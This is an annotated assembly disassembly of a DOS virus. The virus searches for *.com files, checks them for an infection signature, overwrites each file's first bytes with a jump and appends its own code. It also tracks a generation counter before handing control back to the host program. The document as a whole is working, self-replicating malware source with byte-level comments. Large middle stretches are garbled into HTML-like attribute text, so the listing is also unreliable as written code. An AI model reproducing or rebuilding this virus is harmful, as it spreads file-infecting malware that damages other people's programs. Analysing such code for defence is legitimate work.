

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a

		org	100h

start:		nop						;0100 90
		jmp	loc_11B5				;0101 E9 10B1

;............................................
		org	11B5h
;............................................

loc_11B5:	call	sub_11C0		;get virus base	;11B5 E8 0008
		sub	ax,3					;11B8 2D 0003
		mov	si,ax					;11BB 8B F0
		jmp	short loc_11C8				;11BD EB 09

		nop						;11BF 90

;====================================================
;		Get Virus Base Address
;----------------------------------------------------
sub_11C0	proc	near
		mov	di,0					;11C0 BF 0000
		mov	bp,sp					;11C3 8B EC
		mov	ax,[bp+di]	;proc return address	;11C5 8B 03
		retn						;11C7 C3
sub_11C0	endp


;====================================================
loc_11C8:	push	si		;<restore victim="" bytes="" ;11c8="" 56="" mov="" cx,4="" ;11c9="" b9="" 0004="" add="" si,16dh="" ;data_016d="safes" ;11cc="" 81="" c6="" 016d="" mov="" ax,ds="" ;11d0="" 8c="" d8="" mov="" es,ax="" ;11d2="" 8e="" c0="" mov="" di,0100h="" ;start="" of="" program="" ;11d4="" bf="" 0100="" rep="" movsb="" ;11d7="" f3/="" a4="" pop="" si="" ;11d9="" 5e="" push="" si=""></restore><save psp="" ;11da="" 56="" mov="" di,si="" ;11db="" 8b="" fe="" add="" di,1cbh="" ;data_01cb="" ;11dd="" 81="" c7="" 01cb="" mov="" si,0="" ;psp="" address="" ;11e1="" be="" 0000="" mov="" cx,100h="" ;11e4="" b9="" 0100="" rep="" movsb="" ;11e7="" f3/="" a4="" pop="" si="" ;11e9="" 5e=""></save><increment virus="" generation="" level="" mov="" ax,[si+176h]="" ;data_0176="" ;11ea="" 8b="" 84="" 0176="" inc="" ax="" ;11ee="" 40="" mov="" [si+176h],ax="" ;data_0176="" ;11ef="" 89="" 84="" 0176="" mov="" ah,2fh="" ;get="" dta="" ptr="" into="" es:bx="" ;11f3="" b4="" 2f="" int="" 21h="" ;11f5="" cd="" 21="" mov="" [si+169h],bx="" ;data_0169="offset" ;11f7="" 89="" 9c="" 0169="" mov="" ax,es="" ;11fb="" 8c="" c0="" mov="" [si+16bh],ax="" ;data_016b="segment" ;11fd="" 89="" 84="" 016b="" mov="" ax,ds="" ;1201="" 8c="" d8="" mov="" es,ax="" ;1203="" 8e="" c0="" mov="" ah,1ah="" ;set="" dta="" to="" ds:dx="" ;1205="" b4="" 1a="" mov="" dx,187h="" ;data_0187="new" dta="" ;1207="" ba="" 0187="" add="" dx,si="" ;120a="" 03="" d6="" int="" 21h="" ;120c="" cd="" 21="" mov="" cx,0="" ;attributes="" to="" match="" ;120e="" b9="" 0000="" mov="" dx,0163h="" ;data_0163="pathname" ;1211="" ba="" 0163="" add="" dx,si="" ;1214="" 03="" d6="" mov="" ah,4eh="" ;find="" 1st="" filenam="" match="" ;1216="" b4="" 4e="" int="" 21h="" ;1218="" cd="" 21="" jnc="" loc_121f="" ;121a="" 73="" 03="" jmp="" loc_12bb="" ;-=""> file not found	;121C E9 009C

loc_121F:	mov	ax,ds					;121F 8C D8
		mov	es,ax					;1221 8E C0
		call	sub_12F4	;get file size & name	;1223 E8 00CE

					;<- file="" infecting="" loop="" loc_1226:="" mov="" ax,3d02h="" ;open="" file,="" al="mode" ;1226="" b8="" 3d02="" mov="" dx,si="" ;1229="" 8b="" d6="" add="" dx,178h="" ;data_0178="file" name="" ;122b="" 81="" c2="" 0178="" int="" 21h="" ;122f="" cd="" 21="" jnc="" loc_1236="" ;1231="" 73="" 03="" jmp="" loc_12bb="" ;error="" opening="" file="" ;1233="" e9="" 0085="" loc_1236:="" mov="" bx,ax="" ;1236="" 8b="" d8="" mov="" ah,3fh="" ;read="" file="" ;1238="" b4="" 3f="" mov="" dx,si="" ;virus="" base="" ;123a="" 8b="" d6="" add="" dx,1b7h="" ;data_01b7="file" buffer="" ;123c="" 81="" c2="" 01b7="" mov="" cx,0ah="" ;read="" 10="" bytes="" ;1240="" b9="" 000a="" int="" 21h="" ;1243="" cd="" 21="" jnc="" loc_124a="" ;1245="" 73="" 03="" jmp="" short="" loc_12bb="" ;-=""> read error		;1247 EB 72
		nop						;1249 90

loc_124A:	mov	ax,4200h	;move file ptr BOF+offs	;124A B8 4200
		xor	dx,dx					;124D 33 D2
		xor	cx,cx					;124F 33 C9
		int	21h					;1251 CD 21
		mov	ax,word ptr ds:[si+1B7h]		;1253 8B 84 01B7
		cmp	ax,0E990h	;virus signature	;1257 3D E990
		jne	loc_125F	; -> file not infected	;125A 75 03
		jmp	loc_12F2	; -> file contaminated	;125C E9 0093

loc_125F:	mov	cx,4		;safed bytes count	;125F B9 0004
		mov	di,si					;1262 8B FE

					;<- victim="" byte="" saving="" loop="" locloop_1264:="" mov="" ah,byte="" ptr="" ds:[di+1b7h]="" ;1264="" 8a="" a5="" 01b7="" mov="" [di+16dh],ah="" ;victim="" bytes="" safes="" ;1268="" 88="" a5="" 016d="" inc="" di="" ;126c="" 47="" loop="" locloop_1264="" ;126d="" e2="" f5=""></-><- begin="" of="" file="" modyfication="" mov="" ax,0e990h="" ;126f="" b8="" e990="" mov="" word="" ptr="" ds:[si+1b7h],ax="" ;1272="" 89="" 84="" 01b7="" mov="" ax,[si+172h]="" ;file="" size="" ;1276="" 8b="" 84="" 0172="" sub="" ax,4="" ;virus="" start="" code="" length;127a="" 2d="" 0004="" mov="" word="" ptr="" ds:[si+1b9h],ax="" ;127d="" 89="" 84="" 01b9="" mov="" cx,4="" ;bytes="" to="" write="" ;1281="" b9="" 0004="" mov="" dx,1b7h="" ;file="" buffer="" ;1284="" ba="" 01b7="" add="" dx,si="" ;virus="" base="" ;1287="" 03="" d6="" mov="" ah,40h="" ;write="" file="" ;1289="" b4="" 40="" int="" 21h="" ;128b="" cd="" 21="" mov="" ax,4202h="" ;move="" file="" ptr="" eof+offs="" ;128d="" b8="" 4202="" xor="" dx,dx="" ;1290="" 33="" d2="" xor="" cx,cx="" ;1292="" 33="" c9="" int="" 21h="" ;1294="" cd="" 21="" mov="" dx,si="" ;begin="" of="" virus="" address="" ;1296="" 8b="" d6="" mov="" cx,178h="" ;virus="" code="" length="" ;1298="" b9="" 0178="" mov="" ah,40h="" ;write="" file="" ;129b="" b4="" 40="" int="" 21h="" ;129d="" cd="" 21="" loc_129f:="" mov="" ah,3eh="" ;close="" file="" ;129f="" b4="" 3e="" int="" 21h="" ;12a1="" cd="" 21="" mov="" ah,4fh="" ;find="" next="" filename="" ;12a3="" b4="" 4f="" mov="" dx,187h="" ;dta="" address="" ;12a5="" ba="" 0187="" add="" dx,si="" ;12a8="" 03="" d6="" int="" 21h="" ;12aa="" cd="" 21="" jc="" loc_12bb="" ;-=""> not found		;12AC 72 0D

		mov	ax,0					;12AE B8 0000
		mov	[si+172h],ax	;file size		;12B1 89 84 0172
		call	sub_12F4	;save file name & size	;12B5 E8 003C
		jmp	loc_1226				;12B8 E9 FF6B

					;<-- file="" error="" loc_12bb:="" push="" ds="" ;12bb="" 1e="" mov="" dx,[si+169h]="" ;victim="" dta="" offset="" ;12bc="" 8b="" 94="" 0169="" mov="" ax,[si+16bh]="" ;victim="" dta="" segment="" ;12c0="" 8b="" 84="" 016b="" mov="" ds,ax="" ;12c4="" 8e="" d8="" mov="" ah,1ah="" ;set="" dta="" to="" ds:dx="" ;12c6="" b4="" 1a="" int="" 21h="" ;12c8="" cd="" 21="" pop="" ds="" ;12ca="" 1f="" push="" si="" ;12cb="" 56="" add="" si,1cbh="" ;saved="" psp="" content="" ;12cc="" 81="" c6="" 01cb="" mov="" di,0="" ;12d0="" bf="" 0000="" mov="" cx,100h="" ;12d3="" b9="" 0100="" rep="" movsb="" ;12d6="" f3/="" a4="" pop="" si="" ;12d8="" 5e="" mov="" ax,si="" ;12d9="" 8b="" c6="" add="" ax,13ch="" ;offset="" loc_12f1="" ;12db="" 05="" 013c="" sub="" ax,100h="" ;-="" psp="" length="" ;12de="" 2d="" 0100="" xor="" bx,bx="" ;12e1="" 33="" db="" sub="" bx,ax="" ;bx="jmp" distance="" to="" 100h;12e3="" 2b="" d8="" mov="" [si+13ah],bx="" ;jmp="" distance="" change="" ;12e5="" 89="" 9c="" 013a="" mov="" cx,0ffffh="" ;slow="" down="" execution="" ;12e9="" b9="" ffff="" locloop_12ec:="" loop="" locloop_12ec="" ;12ec="" e2="" fe="" db="" 0e9h="" ;jmp="" opcode="" ;12ee="" e9="" data_013a="" dw="" 0="" ;jmp="" to="" 100h="" distance="" ;12ef="" 00="" 00="" db="" 0="" ;12f1="" 00=""></--><- file="" contaminted="" loc_12f2:="" jmp="" loc_129f="" ;12f2="" eb="" ab="" ;----------------------------------------------------="" ;="" save="" file="" parameters="" ;----------------------------------------------------="" sub_12f4="" proc="" near="" mov="" di,si="" ;virus="" base="" address="" ;12f4="" 8b="" fe="" push="" si="" ;12f6="" 56="" add="" si,1a5h="" ;data_01a5="DTA" file="" name;12f7="" 81="" c6="" 01a5="" add="" di,178h="" ;data_0178="file" name="" ;12fb="" 81="" c7="" 0178="" mov="" cx,0fh="" ;file="" name="" length="13" ;12ff="" b9="" 000f="" cld="" ;1302="" fc="" rep="" movsb="" ;1303="" f3/="" a4="" pop="" si="" ;1305="" 5e="" push="" si="" ;1306="" 56="" mov="" di,si="" ;1307="" 8b="" fe="" add="" si,1a1h="" ;data_01a1="DTA" file="" size;1309="" 81="" c6="" 01a1="" add="" di,172h="" ;data_0172="file" size="" ;130d="" 81="" c7="" 0172="" mov="" cx,4="" ;1311="" b9="" 0004="" rep="" movsb="" ;1314="" f3/="" a4="" pop="" si="" ;1316="" 5e="" retn="" ;1317="" c3="" sub_12f4="" endp="" data_0163="" db="" '*.com',0="" ;search="" path="" ;1318="" 2a="" 2e="" 43="" 4f="" 4d="" 00="" data_0169="" dw="" 00080h="" ;victim="" dta="" offset="" ;131e="" 80="" 00="" data_016b="" dw="" 01072h="" ;victim="" dta="" segment="" ;1320="" 72="" 10="" data_016d="" db="" 0e9h,3eh,0dh,3="" ;victim="" bytes="" safes="" ;1322="" e9="" 3e="" 0d="" 03="" db="" 00h="" ;1326="" 00="" data_0172="" dd="" 010b5h="" ;uninfected="" file="" size="" ;1327="" b5="" 10="" 00="" 00="" data_0176="" dw="" 002h="" ;virus="" generation="" ;132b="" 02="" 00="" ;---------------end="" of="" virus="" code-----------------="" data_0178="" db="" 15="" dup="" (?)="" ;file="" name="" data_0187="" db="" 1ah="" dup="" (?)="" ;virus="" dta="" data_01a1="" dd="" ;="" file="" size="" data_01a5="" db="" 15="" dup="" (?)="" ;="" file="" name="" db="" 3="" dup="" (?)="" data_01b7="" db="" 2="" dup="" (?)="" ;first="" 10="" bytes="" of="" victim="" data_01b9="" db="" 8="" dup="" (?)="" db="" 10="" dup="" (?)="" data_01cb="" db="" 100h="" dup="" (?)="" ;safes="" for="" psp="" content="" seg_a="" ends="" end="" start="" =""></-></-></-></increment>